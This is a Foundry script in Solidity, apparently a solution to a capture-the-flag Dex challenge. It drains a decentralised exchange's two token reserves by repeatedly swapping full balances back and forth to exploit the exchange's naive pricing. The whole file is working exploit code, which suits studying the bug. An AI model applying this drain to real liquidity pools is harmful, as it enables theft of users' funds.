// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {Dex} from "../src/Dex.sol";
// import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract HackDexScript is Script {
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a <= b ? a : b;
    }

    function run() public {
        HelperConfig helperConfig = new HelperConfig();
        Dex dex = helperConfig.getDexConfig().dex;
        ERC20 token1 = ERC20(dex.token1());
        ERC20 token2 = ERC20(dex.token2());
        console.log("Token1 balance: ", token1.balanceOf(address(dex)));
        console.log("Token2 balance: ", token2.balanceOf(address(dex)));

        vm.startBroadcast();
        token1.approve(address(dex), 1000000 ether);
        token2.approve(address(dex), 1000000 ether);
        vm.stopBroadcast();

        uint256 count = 0;

        while (token1.balanceOf(address(dex)) > 0 && token2.balanceOf(address(dex)) > 0 && count < 3) {
            count++;
            address tokenFrom;
            address tokenTo;
            if (token1.balanceOf(address(dex)) >= token2.balanceOf(address(dex))) {
                tokenFrom = dex.token2();
                tokenTo = dex.token1();
            } else {
                tokenFrom = dex.token1();
                tokenTo = dex.token2();
            }
            console.log("TokenFrom: ", address(tokenFrom));
            console.log("TokenTo: ", address(tokenTo));
            console.log("TokenFrom balance: ", ERC20(tokenFrom).balanceOf(msg.sender));
            console.log("TokenTo balance: ", ERC20(tokenTo).balanceOf(msg.sender));
            console.log("TokenFrom dex balance: ", ERC20(tokenFrom).balanceOf(address(dex)));
            console.log("TokenTo dex balance: ", ERC20(tokenTo).balanceOf(address(dex)));
            console.log(
                "Expected Token To:",
                dex.getSwapPrice(address(tokenFrom), address(tokenTo), ERC20(tokenFrom).balanceOf(msg.sender))
            );
            uint256 maxAmountIn = ERC20(tokenFrom).balanceOf(address(dex));
            uint256 amountIn = min(maxAmountIn, ERC20(tokenFrom).balanceOf(msg.sender));
            console.log("AmountIn: ", amountIn);
            console.log("MaxAmountIn: ", maxAmountIn);
            vm.startBroadcast();
            dex.swap(address(tokenFrom), address(tokenTo), amountIn);
            vm.stopBroadcast();
            console.log("TokenFrom balance after: ", ERC20(tokenFrom).balanceOf(msg.sender));
            console.log("TokenTo balance after: ", ERC20(tokenTo).balanceOf(msg.sender));
            console.log("TokenFrom dex balance after: ", ERC20(tokenFrom).balanceOf(address(dex)));
            console.log("TokenTo dex balance after: ", ERC20(tokenTo).balanceOf(address(dex)));
        }
    }
}
